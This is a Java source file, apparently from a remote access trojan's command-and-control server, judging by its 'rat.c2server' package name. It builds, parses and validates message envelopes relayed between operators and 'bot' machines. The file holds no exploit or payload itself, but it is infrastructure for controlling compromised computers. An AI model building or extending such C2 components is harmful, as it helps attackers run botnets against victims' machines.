package devs.alex.sah.rat.c2server.services.impl;

import devs.alex.sah.rat.c2server.configuration.MessagesConfiguration;
import devs.alex.sah.rat.c2server.models.Message;
import devs.alex.sah.rat.c2server.services.MessagesBuilder;
import devs.alex.sah.rat.c2server.utils.Utils;
import org.springframework.stereotype.Service;
import org.springframework.web.socket.BinaryMessage;
import org.springframework.web.socket.TextMessage;

import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

@Service
public class MessagesBuilderImpl implements MessagesBuilder {

    private final MessagesConfiguration mConfig;
    public MessagesBuilderImpl(MessagesConfiguration mConfig) {
        this.mConfig = mConfig;
    }

    private String section(String key, String value){
        return mConfig.delimiters.section + key + mConfig.delimiters.value + value;
    }


    @Override
    public String generateUser2BotFirstEnvelope(String module, String associative_request, String ResponseType, String fullSize) {
        return Utils.lengthCheck(section(mConfig.keys.packageType, mConfig.packages.firstPart) +
                        control2botEnvelopeBase(module, associative_request) +
                        section(mConfig.keys.responseType, ResponseType) +
                        section(mConfig.keys.fullMessageSize, fullSize));
    }
    @Override
    public String generateUser2BotSingleEnvelope(String module, String associative_request, String RequiredResponse) {
        return Utils.lengthCheck(section(mConfig.keys.packageType, mConfig.packages.singleMessage) +
                        control2botEnvelopeBase(module, associative_request) +
                        section(mConfig.keys.responseType, RequiredResponse));
    }
    @Override
    public String generateUser2BotEnvelope(String module, String associativeRequest, String packageType){
        return Utils.lengthCheck(section(mConfig.keys.packageType, packageType) +
                control2botEnvelopeBase(module, associativeRequest));
    }
    private String control2botEnvelopeBase(String module, String associative_request){
        return section(mConfig.keys.targetModule, module) + section(mConfig.keys.requestID, associative_request);
    }




    @Override
    public String generateUser2UserFirstEnvelope(String userId, String module, String requiredResponse, String fullSize) {
        return Utils.lengthCheck(section(mConfig.keys.packageType, mConfig.packages.firstPart) +
                control2controlEnvelopeBase(module, userId) +
                section(mConfig.keys.responseType, requiredResponse) +
                section(mConfig.keys.fullMessageSize, fullSize));
    }

    @Override
    public String generateUser2UserSingleEnvelope(String userId, String module, String requiredResponse) {
        return Utils.lengthCheck(section(mConfig.keys.packageType, mConfig.packages.singleMessage) +
                control2controlEnvelopeBase(module, userId) +
                section(mConfig.keys.responseType, requiredResponse));
    }

    @Override
    public String generateUser2UserEnvelope(String userId, String module, String packageType) {
        return Utils.lengthCheck(section(mConfig.keys.packageType, packageType) +
                control2controlEnvelopeBase(module, userId));
    }

    private String control2controlEnvelopeBase(String module, String userId){
        return section(mConfig.keys.targetType, mConfig.targets.controlSide) +
                section(mConfig.keys.targetModule, module) +
                section(mConfig.keys.targetID, userId);
    }






    @Override
    public String generateBot2UserFirstEnvelope(String botId, String module, String requestId, String fullSize, String isLast) {
        return Utils.lengthCheck(section(mConfig.keys.packageType, mConfig.packages.firstPart) +
                        bot2controlEnvelopeBase(botId, module, requestId) +
                        section(mConfig.keys.fullMessageSize, fullSize) +
                        section(mConfig.keys.isLast, isLast));
    }
    @Override
    public String generateBot2UserSingleEnvelope(String botId, String module, String requestId, String isLast) {
        return Utils.lengthCheck(section(mConfig.keys.packageType, mConfig.packages.singleMessage) +
                        bot2controlEnvelopeBase(botId, module, requestId) +
                        section(mConfig.keys.isLast, isLast));
    }
    @Override
    public String generateBot2UserEnvelope(String botId, String module, String requestId, String packageType) {
        return Utils.lengthCheck(section(mConfig.keys.packageType, packageType) + bot2controlEnvelopeBase(botId, module, requestId));
    }

    @Override
    public String generateServer2botEnvelope (String botId, String module, String requestId){
        return Utils.lengthCheck(
                section(mConfig.keys.packageType, mConfig.packages.singleMessage) + server2botEnvelopeBase(botId, module, requestId));
    }

    @Override
    public String generateServer2UserEnvelope(String userId, String module, String requestId) {
        return Utils.lengthCheck(
                section(mConfig.keys.packageType, mConfig.packages.singleMessage) + server2controlEnvelopeBase(userId, module, requestId));
    }

    private String bot2controlEnvelopeBase(String botId, String module, String requestId){
        return section(mConfig.keys.targetType, mConfig.targets.botSide) +
                section(mConfig.keys.targetID, botId) +
                section(mConfig.keys.targetModule, module) +
                section(mConfig.keys.requestID, requestId);
    }

    private String server2controlEnvelopeBase(String userId, String module, String requestId){
        return section(mConfig.keys.targetType, mConfig.targets.serverSide) +
                section(mConfig.keys.targetID, userId) +
                section(mConfig.keys.targetModule, module) +
                section(mConfig.keys.requestID, requestId);
    }
    private String server2botEnvelopeBase(String botId, String module, String requestId){
        return section(mConfig.keys.targetType, mConfig.targets.serverSide) +
                section(mConfig.keys.targetID, botId) +
                section(mConfig.keys.targetModule, module) +
                section(mConfig.keys.requestID, requestId);
    }


    @Override
    public Message<String> parseMessage(TextMessage message, StringBuffer errors){
        try {
            int pos = message.getPayload().indexOf(mConfig.delimiters.section);
            int envelopeSize = Integer.parseInt(message.getPayload().substring(0, pos));

            String envelope = message.getPayload().substring(pos + 1, envelopeSize);

            Message<String> parsedMessage = new Message<>(message.getPayload().substring(envelopeSize));
            parseEnvelope(parsedMessage, envelope, errors);

            return parsedMessage;

        } catch (RuntimeException exception){
            errors.append("Failed to extract envelope");
            return null;
        }
    }

    @Override
    public Message<ByteBuffer> parseMessage(BinaryMessage srcMessage, StringBuffer errors){
        String message = StandardCharsets.UTF_8.decode(srcMessage.getPayload()).toString();

        try {
            int pos = message.indexOf(mConfig.delimiters.section);
            int envelopeSize = Integer.parseInt(message.substring(0, pos));
            String envelope = message.substring(pos + 1, envelopeSize);

            byte[] binaryData = new byte[srcMessage.getPayload().limit() - envelopeSize];
            srcMessage.getPayload().get(envelopeSize, binaryData);
            Message<ByteBuffer> parsedMessage = new Message<>(ByteBuffer.wrap(binaryData));
            parseEnvelope(parsedMessage, envelope, errors);
            return parsedMessage;

        } catch (RuntimeException exception){
            errors.append("Failed to extract envelope");
            return null;
        }
    }

    @Override
    public String generateErrorEnvelope(String targetType) {
        return Utils.lengthCheck(
                section(mConfig.keys.packageType, mConfig.packages.singleMessage) +
                section(mConfig.keys.targetModule, "error") +
                section(mConfig.keys.targetType, mConfig.targets.serverSide));
    }


    private void parseEnvelope(Message<?> message, String envelope, StringBuffer errors){
        String[] sections = envelope.split( mConfig.delimiters.section);
        Pattern pattern = Pattern.compile( mConfig.delimiters.value);

        for (String section: sections) { // TODO test
            Matcher matcher = pattern.matcher(section);
            if (matcher.find()) {
                String key = section.substring(0, matcher.start());
                String value = section.substring(matcher.end());

                if (key.equals(mConfig.keys.isLast)) {
                    message.setIsLast(value);
                } else if(key.equals(mConfig.keys.packageType)){
                    message.setPackageType(value);
                }else if(key.equals(mConfig.keys.targetModule)){
                    message.setTargetModule(value);
                }else if(key.equals(mConfig.keys.targetID)){
                    message.setTargetID(value);
                }else if(key.equals(mConfig.keys.targetType)){
                    message.setTargetType(value);
                }else if(key.equals(mConfig.keys.fullMessageSize)){
                    message.setFullMessageSize(value);
                }else if(key.equals(mConfig.keys.requestID)){
                    message.setRequestID(value);
                }else if(key.equals(mConfig.keys.responseType)){
                    message.setResponseType(value);
                } else{
                    errors.append("Undefined key [").append(key).append("] value [").append(value).append("]\n");
                }
            } else {
                errors.append("Failed to read section: ").append(section).append(";\n");
            }
        }
        if(message.getPackageType() == null){
            errors.append("PackageType cannot be null\n");
        }
    }


    @Override
    public void validateEnvelope(String codedEnvelope, StringBuffer errors, ValidationType validationType) {
        String SectionRegex = mConfig.delimiters.section+"[a-zA-Z]+"+mConfig.delimiters.value+"[0-9a-zA-Z]+";
        Pattern pattern = Pattern.compile("\\d{1,3}["+SectionRegex+"]{2,}"); // FIXME
        Matcher matcher = pattern.matcher(codedEnvelope);
        /* switch (validationType){
           case bot2controlOutbox:
            case control2botOutbox:
            case control2controlOutbox:
                while (matcher.find()){
                    System.out.println(codedEnvelope.substring(matcher.start(), matcher.end()));
                }
                break;
            default:
                errors.append("Validation failed\n");
        }*/
    }



    @Override
    public void validateEnvelope(Message<?> message, StringBuffer errors, ValidationType validationType) {

        switch (validationType){
            case control2controlInbox:
            case control2botInbox:
                if(message.getPackageType().equals(mConfig.packages.continuation)|| message.getPackageType().equals(mConfig.packages.lastPart)){
                    validateTargetParameters(message.getTargetType(), message.getTargetID(), errors);
                }else{
                    validateTargetParameters(message.getTargetType(), message.getTargetID(), message.getTargetModule(), errors);
                }

                if(isNullOrEmpty(message.getRequestID())) {
                    errors.append("key [").append(mConfig.keys.requestID).append("] cannot be null or empty\n");
                }
                if((message.getPackageType().equals(mConfig.packages.singleMessage) || message.getPackageType().equals(mConfig.packages.firstPart))
                        && isNullOrEmpty(message.getResponseType())){
                    errors.append("key [").append(mConfig.keys.responseType).append("] cannot be null or empty\n");
                }
                if(message.getPackageType().equals(mConfig.packages.firstPart)){
                    fullMessageSizeCheck(message.getFullMessageSize(), errors);
                }
                break;
            case bot2controlInbox:
                if(isNullOrEmpty(message.getRequestID())) {
                    errors.append("key [").append(mConfig.keys.requestID).append("] cannot be null or empty\n");
                }
                if((message.getPackageType().equals(mConfig.packages.singleMessage) || message.getPackageType().equals(mConfig.packages.lastPart))
                        && isNullOrEmpty(message.getIsLast())){
                    errors.append("key [").append(mConfig.keys.isLast).append("] cannot be null or empty\n");
                }
                if(message.getPackageType().equals(mConfig.packages.firstPart)){
                    fullMessageSizeCheck(message.getFullMessageSize(), errors);
                }
                if(message.getTargetType() != null){
                    errors.append("TargetType is not null\n");
                }
                break;
            default:
                errors.append("Validation failed\n");
        }
    }

    private void validateTargetParameters(String type, String id, String module, StringBuffer errors){
        if (isNullOrEmpty(module)) {
            errors.append("key [").append(mConfig.keys.targetModule).append("] cannot be null or empty\n");
        }
        if (isNullOrEmpty(type)){
            errors.append("key [").append(mConfig.keys.targetType).append("] cannot be null or empty\n");
        }
        if (isNullOrEmpty(id)) {
            errors.append("key [").append(mConfig.keys.targetID).append("] cannot be null or empty\n");
        }
    }
    private void validateTargetParameters(String type, String id, StringBuffer errors){
        if (isNullOrEmpty(type)){
            errors.append("key [").append(mConfig.keys.targetType).append("] cannot be null or empty\n");
        }
        if (isNullOrEmpty(id)) {
            errors.append("key [").append(mConfig.keys.targetID).append("] cannot be null or empty\n");
        }
    }
    private boolean isNullOrEmpty(String value){
        return value == null || value.isEmpty();
    }

    private void fullMessageSizeCheck(String fs, StringBuffer errors){
        if(fs == null || fs.isEmpty()){
            errors.append("key [").append(mConfig.keys.fullMessageSize).append("] cannot be null or empty\n");
        }
    }


}
